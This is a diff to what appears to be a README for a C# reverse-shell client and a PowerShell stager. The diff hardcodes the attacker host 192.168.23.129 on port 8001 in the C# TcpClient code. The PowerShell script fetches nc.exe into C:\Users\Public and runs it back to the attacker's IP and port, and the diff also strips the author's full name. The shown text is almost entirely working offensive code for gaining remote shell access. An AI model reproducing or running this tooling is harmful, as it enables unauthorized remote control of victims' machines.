@@ -3,6 +3,10 @@
 **C# script**
 
 ```C#
+using System.Diagnostics;
+using System.Net.Sockets;
+using System.Text;
+
 namespace cc
 {
     public class Program
@@ -10,13 +14,13 @@ namespace cc
         public static void Main(string[] args)
         {
             /*
-             * Robert Chaves Perez (r0b0t95) 2023
+             * r0b0t95 2023
              */
 
             if (args.Length == 2)
             {
-                string serverIp = args[0];
-                int port = Convert.ToInt16(args[1]);
+                string serverIp = "192.168.23.129"; //args[0];
+                int port = 8001; //Convert.ToInt16(args[1]);
 
                 TcpClient client = new TcpClient(serverIp, port);
                 NetworkStream stream = client.GetStream();
@@ -181,7 +185,7 @@ $ip = '192.168.23.129'
 $portNetCat = '8001'
 $portPython3 = '8000'
 
-$files = 'netCat.deps.json', 'netCat.dll', 'netCat.exe', 'netCat.pdb', 'netCat.runtimeconfig.json'
+$files = 'nc.exe', 'nc.pdb'
 
 for ($i = 0; $i -lt $files.Length; ++$i){
 
@@ -197,7 +201,7 @@ Start-Sleep -Seconds 1
 
 Set-Location C:\Users\Public
 
-.\netCat.exe $ip $portNetCat
+.\nc.exe $ip $portNetCat
 ```
 
 **Execute from your server**
